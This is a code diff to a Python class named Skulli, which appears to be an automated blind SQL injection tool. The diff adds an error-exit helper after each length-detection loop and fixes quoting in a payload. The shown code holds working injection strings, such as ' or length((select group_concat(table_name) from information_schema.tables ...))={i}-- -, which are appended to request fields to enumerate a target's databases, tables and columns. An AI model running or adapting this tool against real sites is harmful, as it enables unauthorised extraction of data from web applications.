@@ -92,7 +92,12 @@ class Skulli:
             else:
                 break
         return select_option
-    
+
+    def length_value(self, length):
+        if length == None:
+            print('Ocurrio un error a la hora de la inyeccion, puede que no tenga permisos para leer esa base de datos/tabla/columna.')
+            sys.exit(1)
+
     def get_databases_len(self):
         ln = None
 
@@ -109,6 +114,7 @@ class Skulli:
                 ln = i
                 break
         self.data[self.skll] = self.old_data
+        self.length_value(ln)
         return ln
 
     def get_databases(self,db_len):
@@ -140,7 +146,7 @@ class Skulli:
         ln = None
 
         for i in range(1,200):
-            length = f"' or length((select group_concat(table_name) from information_schema.tables where table_schema=\'{db}\'))={i}-- -"
+            length = f"' or length((select group_concat(table_name) from information_schema.tables where table_schema='{db}'))={i}-- -"
             self.data[self.skll] += length
             
             if self.method == 'post':
@@ -152,6 +158,7 @@ class Skulli:
                 ln = i
                 break
         self.data[self.skll] = self.old_data
+        self.length_value(ln)
         return ln
 
     def get_tables(self, tb_len, db):
@@ -195,6 +202,8 @@ class Skulli:
                 ln = i
                 break
         self.data[self.skll] = self.old_data
+        
+        self.length_value(ln)
         return ln
 
     def get_columns(self, cl_len, db, table):
@@ -238,6 +247,8 @@ class Skulli:
                 ln = i
                 break
         self.data[self.skll] = self.old_data
+        
+        self.length_value(ln)
         return ln
 
     def get_values(self, vl_len, db, table, columns):
